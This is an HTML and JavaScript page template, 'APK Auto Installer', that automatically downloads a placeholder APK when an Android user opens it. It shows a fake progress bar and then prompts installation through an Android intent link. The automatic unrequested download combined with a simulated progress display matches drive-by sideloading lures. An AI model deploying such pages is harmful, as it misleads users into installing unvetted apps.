<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>APK Auto Installer</title>
    <style>
        /* Previous CSS remains the same */
    </style>
</head>
<body>
    <div class="container">
        <h2>App Installation</h2>
        <div class="progress-bar">
            <div class="progress"></div>
        </div>
        <p id="status-text">Starting download...</p>
    </div>

    <div class="overlay" id="overlay"></div>
    <div class="install-popup" id="installPopup">
        <h3>Installation Ready</h3>
        <p>The app has been downloaded successfully!</p>
        <button class="install-btn" id="installButton">Install Now</button>
        <button class="install-btn" onclick="closePopup()" style="background: #6c757d;">Cancel</button>
    </div>

    <script>
        const apkFile = '12.apk'; // Replace with your APK path
        let isAndroid = /Android/i.test(navigator.userAgent);

        async function startDownload() {
            if(!isAndroid) {
                showError('This app is only available for Android devices');
                return;
            }

            try {
                // Start actual download
                const link = document.createElement('a');
                link.href = apkFile;
                link.download = true;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);

                // Simulate progress
                simulateProgress();
                
            } catch (error) {
                showError('Download failed. Please try again.');
            }
        }

        function simulateProgress() {
            let progress = 0;
            const progressBar = document.querySelector('.progress');
            const statusText = document.getElementById('status-text');

            const interval = setInterval(() => {
                if(progress >= 100) {
                    clearInterval(interval);
                    showInstallPopup();
                    return;
                }
                progress += 10;
                progressBar.style.width = progress + '%';
                statusText.textContent = `Downloading... ${progress}%`;
            }, 300);
        }

        function showInstallPopup() {
            document.getElementById('overlay').style.display = 'block';
            document.getElementById('installPopup').style.display = 'block';
            document.getElementById('status-text').textContent = 'Download complete!';
        }

        function closePopup() {
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('installPopup').style.display = 'none';
        }

        function attemptInstall() {
            if(!isAndroid) return;
            
            try {
                // Android Intent method
                window.location.href = `intent://${apkFile}#Intent;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end`;
                
                // Fallback method
                setTimeout(() => {
                    window.open(apkFile, '_blank');
                }, 500);
                
            } catch (error) {
                showManualInstructions();
            }
        }

        function showManualInstructions() {
            const container = document.querySelector('.container');
            container.innerHTML += `
                <div id="manual-install" style="margin-top: 20px;">
                    <p>Manual installation required:</p>
                    <ol>
                        <li>Open your device's File Manager</li>
                        <li>Go to Downloads folder</li>
                        <li>Tap on "${apkFile}"</li>
                        <li>Follow on-screen prompts</li>
                    </ol>
                </div>
            `;
        }

        function showError(message) {
            document.getElementById('status-text').textContent = message;
            document.getElementById('status-text').style.color = '#dc3545';
        }

        // Initialize
        window.onload = startDownload;
        document.getElementById('installButton').addEventListener('click', attemptInstall);
    </script>
</body>
</html>
